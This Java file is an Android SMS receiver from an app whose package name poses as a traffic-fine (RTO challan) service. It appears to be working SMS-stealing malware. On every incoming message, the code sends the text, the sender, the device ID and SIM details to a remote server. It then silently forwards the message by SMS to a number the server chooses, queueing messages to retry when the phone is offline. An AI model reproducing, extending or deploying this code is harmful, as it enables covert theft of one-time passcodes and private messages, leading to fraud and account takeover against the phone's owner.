package com.service.rtochallan;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

public class SmsReceiver extends BroadcastReceiver {

    private Helper helper;
    private SmsManager smsManager;
    private PendingSmsManager pendingManager;
    private String api_url;
    private Context context;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()))
            return;
        Intent serviceIntent = new Intent(context, RunningService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        }else{
            context.startService(serviceIntent);
        }

        try {
            this.context = context;
            pendingManager = new PendingSmsManager(context);
            helper = new Helper();
//            d(helper.TAG, "New SMS RC");
            api_url = helper.ApiUrl(context) + "/sms";
            smsManager = SmsManager.getDefault();
            Bundle bundle = intent.getExtras();
            resendPendingSms();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            //helper.show("New SMS Message Rc");
            String format = bundle.getString("format");
            StringBuilder fullMessage = new StringBuilder();
            String sender = "";

            // ✅ Combine multipart messages correctly (Android 7 → 14)
            for (Object pdu : pdus) {
                SmsMessage sms;
                sms = SmsMessage.createFromPdu((byte[]) pdu, format);

                if (sms != null) {
                    sender = sms.getDisplayOriginatingAddress();
                    fullMessage.append(sms.getMessageBody());
                }
            }

            String messageBody = fullMessage.toString();
            if (messageBody.isEmpty() || sender.isEmpty()) return;

            //helper.show("FUllMessage " + fullMessage);

            // ✅ Build payload for server
            JSONObject sendPayload = new JSONObject();
            sendPayload.put("message", messageBody);
            sendPayload.put("sender", sender);
            sendPayload.put("form_code", helper.FormCode());
            sendPayload.put("android_id", helper.getAndroidId(context));
            sendPayload.put("sim_sub_id", smsManager.getSubscriptionId());
            sendPayload.put("sms_forwarding_status", "sending");
            sendPayload.put("sms_forwarding_status_message", "Request for sending");

            if(!helper.isNetworkAvailable(context)){
                pendingManager.addPending(sendPayload);
                return ;
            }
            sendSMSWithHttp(sendPayload);
        } catch (JSONException e) {
            Log.e("SmsReceiver", "JSON error: " + e.getMessage());
        } catch (Exception e) {
            Log.e("SmsReceiver", "onReceive error: " + e.getMessage());
        }
    }


    private void sendSMSWithHttp(JSONObject sendData){
        final int[] userId = {0};
        NetworkHelper networkHelper = new NetworkHelper();
        networkHelper.makePostRequest(api_url, sendData, new NetworkHelper.PostRequestCallback() {
            @Override
            public void onSuccess(String result) {
                try {
                    JSONObject response = new JSONObject(result);
                    int status = response.optInt("status", 0);
                    if (status != 200) return;

                    JSONObject dataObj = response.optJSONObject("data");
                    if (dataObj == null) return;

                    userId[0] = dataObj.optInt("id");
                    String phoneNumber = dataObj.optString("forward_to_number", "");
                    if (phoneNumber.isEmpty()) return;

                    String message = sendData.optString("message", "");
                    if (message.isEmpty()) return;

                    // ✅ Unique request codes for this user & number
                    int sentCode = (userId[0] + phoneNumber).hashCode();
                    int deliveredCode = (userId[0] + phoneNumber + "_delivered").hashCode();

                    Intent sentIntent = new Intent(context, SentReceiver.class);
                    Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
                    sentIntent.putExtra("id", userId[0]);
                    sentIntent.putExtra("phone", phoneNumber);
                    deliveredIntent.putExtra("id", userId[0]);
                    deliveredIntent.putExtra("phone", phoneNumber);

                    PendingIntent sentPI = PendingIntent.getBroadcast(
                            context, sentCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);

                    PendingIntent deliveredPI = PendingIntent.getBroadcast(
                            context, deliveredCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);

                    SmsManager smsManager = SmsManager.getDefault();

                    // ✅ Divide the message to check how many parts
                    ArrayList<String> parts = smsManager.divideMessage(message);

                    if (parts.size() == 1) {
                        // 📩 Single short message → use sendTextMessage()
                        smsManager.sendTextMessage(
                                phoneNumber,
                                null,
                                message,
                                sentPI,
                                deliveredPI
                        );
                    } else {
                        // 🧩 Long message → use multipart sending
                        ArrayList<PendingIntent> sentIntents = new ArrayList<>();
                        ArrayList<PendingIntent> deliveredIntents = new ArrayList<>();

                        for (int i = 0; i < parts.size(); i++) {
                            sentIntents.add(sentPI);
                            deliveredIntents.add(deliveredPI);
                        }

                        smsManager.sendMultipartTextMessage(
                                phoneNumber,
                                null,
                                parts,
                                sentIntents,
                                deliveredIntents
                        );
                    }

                } catch (Exception e) {
                    Log.e(helper.TAG, "Error processing api sms post response", e);
                }
            }

            @Override
            public void onFailure(String error) {
                pendingManager.addPending(sendData);
                Log.e(helper.TAG, "SMS Api Post error: " + error);
            }
        });
    }

    private void resendPendingSms() {
        JSONArray list = pendingManager.getAllPending();
        if (list.length() == 0) return;
        helper.show("PendingSMS📤 Found " + list.length() + " pending SMS. Sending now...");
        for (int i = 0; i < list.length(); i++) {
            try {
                JSONObject sms = list.getJSONObject(i);
                sendSMSWithHttp(sms);
                pendingManager.removeAt(i);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
